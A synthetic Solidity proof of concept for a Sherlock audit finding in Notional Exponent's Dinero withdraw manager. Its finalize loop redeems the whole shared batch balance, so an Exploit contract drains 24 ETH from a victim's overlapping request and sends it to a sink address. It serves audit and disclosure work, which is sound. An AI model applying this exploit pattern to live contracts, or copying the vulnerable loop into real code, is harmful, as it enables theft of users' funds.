// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Notional Exponent — DineroWithdrawRequestManager batch overlap (Sherlock H-3, issue 297)
    SYNTHETIC, cheatcode-free reduction. _initiateWithdrawImpl and the finalize loop are
    the audited code. PirexETH._initiateRedemption is the audited while-loop: a 40 ETH
    request spans two 32 ETH batches, so the next request shares the open batch.
    Finalize redeems upxETH.balanceOf(this, i) for the whole range. */

contract PxETH {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract UpxETH {
    mapping(address => mapping(uint256 => uint256)) public balanceOf;

    function mint(address to, uint256 id, uint256 amount) external {
        balanceOf[to][id] += amount;
    }

    function burn(address from, uint256 id, uint256 amount) external {
        balanceOf[from][id] -= amount;
    }
}

contract WETH9 {
    string public constant symbol = "WETH";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

interface IPirexETH {
    enum ValidatorStatus {
        None,
        Staked,
        Withdrawable,
        Dissolved,
        Slashed
    }

    function batchId() external view returns (uint256);
    function initiateRedemption(uint256 amount, address receiver, bool shouldTriggerValidatorExit) external;
    function redeemWithUpxEth(uint256 id, uint256 assets, address receiver) external;
    function status(bytes calldata validator) external view returns (ValidatorStatus);
    function batchIdToValidator(uint256 id) external view returns (bytes memory);
    function outstandingRedemptions() external view returns (uint256);
}

contract PirexETH is IPirexETH {
    uint256 public constant DEPOSIT_SIZE = 32 ether;
    PxETH public immutable pxETH;
    UpxETH public immutable upxETH;
    uint256 public pendingWithdrawal;
    uint256 public batchId = 1;
    mapping(uint256 => bytes) public batchIdToValidator;
    mapping(bytes => ValidatorStatus) public statusOf;

    constructor(PxETH _px, UpxETH _up) {
        pxETH = _px;
        upxETH = _up;
    }

    function initiateRedemption(uint256 amount, address receiver, bool shouldTriggerValidatorExit) external {
        pxETH.transferFrom(msg.sender, address(this), amount);
        _initiateRedemption(amount, receiver, shouldTriggerValidatorExit);
    }

    function _initiateRedemption(uint256 _pxEthAmount, address _receiver, bool _shouldTriggerValidatorExit) internal {
        pendingWithdrawal += _pxEthAmount;
        while (pendingWithdrawal / DEPOSIT_SIZE != 0) {
            uint256 _allocationPossible = DEPOSIT_SIZE + _pxEthAmount - pendingWithdrawal;
            upxETH.mint(_receiver, batchId, _allocationPossible);
            pendingWithdrawal -= DEPOSIT_SIZE;
            _pxEthAmount -= _allocationPossible;
            bytes memory pubKey = abi.encodePacked(batchId);
            batchIdToValidator[batchId++] = pubKey;
            statusOf[pubKey] = ValidatorStatus.Withdrawable;
        }
        if (_shouldTriggerValidatorExit && _pxEthAmount > 0) revert("partial");
        if (_pxEthAmount > 0) {
            upxETH.mint(_receiver, batchId, _pxEthAmount);
        }
    }

    function redeemWithUpxEth(uint256 id, uint256 assets, address receiver) external {
        upxETH.burn(msg.sender, id, assets);
        (bool ok,) = receiver.call{value: assets}("");
        require(ok, "eth");
    }

    // Validators for this run have already exited. Empty keys (the still-open remainder batch) too.
    function status(bytes calldata) external pure returns (ValidatorStatus) {
        return ValidatorStatus.Dissolved;
    }

    function outstandingRedemptions() external pure returns (uint256) {
        return type(uint128).max;
    }

    receive() external payable {}
}

contract DineroWithdrawRequestManager {
    uint16 internal s_batchNonce;
    uint256 internal constant MAX_BATCH_ID = type(uint120).max;
    IPirexETH public immutable PirexETH;
    UpxETH public immutable upxETH;
    PxETH public immutable pxETH;
    WETH9 public immutable WETH;
    mapping(uint256 => address) public requestAccount;

    constructor(IPirexETH _pirex, UpxETH _up, PxETH _px, WETH9 _weth) {
        PirexETH = _pirex;
        upxETH = _up;
        pxETH = _px;
        WETH = _weth;
    }

    function initiateWithdraw(uint256 amount, bytes calldata data) external returns (uint256 requestId) {
        pxETH.transferFrom(msg.sender, address(this), amount);
        requestId = _initiateWithdrawImpl(msg.sender, amount, data);
        requestAccount[requestId] = msg.sender;
    }

    function _initiateWithdrawImpl(address, uint256 amountToWithdraw, bytes calldata) internal returns (uint256) {
        uint256 initialBatchId = PirexETH.batchId();
        pxETH.approve(address(PirexETH), amountToWithdraw);
        PirexETH.initiateRedemption(amountToWithdraw, address(this), false);
        uint256 finalBatchId = PirexETH.batchId();
        uint256 nonce = ++s_batchNonce;
        require(initialBatchId < MAX_BATCH_ID);
        require(finalBatchId < MAX_BATCH_ID);
        // Initial and final batch ids may overlap between requests so the nonce is used to ensure uniqueness
        return nonce << 240 | initialBatchId << 120 | finalBatchId;
    }

    function _decodeBatchIds(uint256 requestId) internal pure returns (uint256 initialBatchId, uint256 finalBatchId) {
        initialBatchId = requestId >> 120 & MAX_BATCH_ID;
        finalBatchId = requestId & MAX_BATCH_ID;
    }

    function finalizeWithdraw(uint256 requestId) external returns (uint256 claimed) {
        (uint256 tokensClaimed, bool finalized) = _finalizeWithdrawImpl(requestAccount[requestId], requestId);
        require(finalized, "not finalized");
        WETH.transfer(requestAccount[requestId], tokensClaimed);
        return tokensClaimed;
    }

    function _finalizeWithdrawImpl(address, uint256 requestId) internal returns (uint256 tokensClaimed, bool finalized) {
        finalized = canFinalizeWithdrawRequest(requestId);
        if (finalized) {
            (uint256 initialBatchId, uint256 finalBatchId) = _decodeBatchIds(requestId);
            for (uint256 i = initialBatchId; i <= finalBatchId; i++) {
                uint256 assets = upxETH.balanceOf(address(this), i); // @> VULN: whole batch balance, not this request's share. FIX: use upxETHBalanceOfRequest[requestId][i].
                if (assets == 0) continue;
                PirexETH.redeemWithUpxEth(i, assets, address(this));
                tokensClaimed += assets;
            }
        }
        WETH.deposit{value: tokensClaimed}();
    }

    function canFinalizeWithdrawRequest(uint256 requestId) public view returns (bool) {
        (uint256 initialBatchId, uint256 finalBatchId) = _decodeBatchIds(requestId);
        uint256 totalAssets;
        for (uint256 i = initialBatchId; i <= finalBatchId; i++) {
            IPirexETH.ValidatorStatus st = PirexETH.status(PirexETH.batchIdToValidator(i));
            if (st != IPirexETH.ValidatorStatus.Dissolved && st != IPirexETH.ValidatorStatus.Slashed) {
                return false;
            }
            totalAssets += upxETH.balanceOf(address(this), i);
        }
        return PirexETH.outstandingRedemptions() > totalAssets;
    }

    receive() external payable {}
}

contract Victim {
    function open(DineroWithdrawRequestManager manager, PxETH px, uint256 amount) external returns (uint256) {
        px.approve(address(manager), amount);
        return manager.initiateWithdraw(amount, "");
    }

    function close(DineroWithdrawRequestManager manager, uint256 requestId) external returns (uint256) {
        return manager.finalizeWithdraw(requestId);
    }
}

contract Exploit {
    address public constant SINK = 0x000000000000000000000000000000000000D00d;

    PxETH public px; // nonce 1
    UpxETH public upx; // nonce 2
    WETH9 public weth; // nonce 3
    PirexETH public pirex; // nonce 4
    DineroWithdrawRequestManager public manager; // nonce 5
    Victim public victim; // nonce 6

    constructor() {
        px = new PxETH();
        upx = new UpxETH();
        weth = new WETH9();
        pirex = new PirexETH(px, upx);
        manager = new DineroWithdrawRequestManager(pirex, upx, px, weth);
        victim = new Victim();
    }

    function run() external payable {
        require(msg.value == 80 ether, "fund");
        (bool ok,) = address(pirex).call{value: msg.value}("");
        require(ok, "send");

        px.mint(address(this), 40 ether);
        px.approve(address(manager), 40 ether);
        uint256 reqA = manager.initiateWithdraw(40 ether, "");

        px.mint(address(victim), 40 ether);
        uint256 reqB = victim.open(manager, px, 40 ether);

        uint256 gotA = manager.finalizeWithdraw(reqA);
        uint256 gotB = victim.close(manager, reqB);
        require(gotA == 64 ether, "A took 64");
        require(gotB == 16 ether, "B left 16");
        uint256 stolen = weth.balanceOf(address(this)) - 40 ether;
        require(stolen == 24 ether, "stolen");
        weth.transfer(SINK, stolen);
        require(weth.balanceOf(SINK) == 24 ether, "sink");
        require(weth.balanceOf(address(victim)) == 16 ether, "victim weth");
    }
}
